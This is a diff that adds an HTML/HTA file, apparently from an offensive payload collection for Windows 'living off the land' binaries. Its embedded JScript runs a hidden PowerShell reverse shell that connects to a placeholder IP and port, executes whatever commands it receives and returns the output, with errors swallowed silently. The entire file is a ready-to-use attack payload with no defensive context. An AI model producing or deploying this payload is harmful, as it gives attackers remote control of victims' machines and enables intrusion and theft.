@@ -1,0 +1,14 @@
+<!-- payloads/windows/lolbins/js_payload.html -->
+<html>
+<head>
+  <script language="JScript">
+    // Reverse shell via mshta/jscript — 2025 hardened version
+    try {
+      var shell = new ActiveXObject("WScript.Shell");
+      var cmd = "powershell -nop -w hidden -c \"$c=new-object net.sockets.tcpclient('REPLACE_IP',REPLACE_PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=iex $d 2>&1 | Out-String;$r2=\"PS \"+(pwd).Path+\"> \"+$r;$s.Write(([text.encoding]::ASCII).GetBytes($r2),0,$r2.Length)}\""
+      shell.Run(cmd, 0, false);
+    } catch (e) {}
+  </script>
+</head>
+<body></body>
+</html>
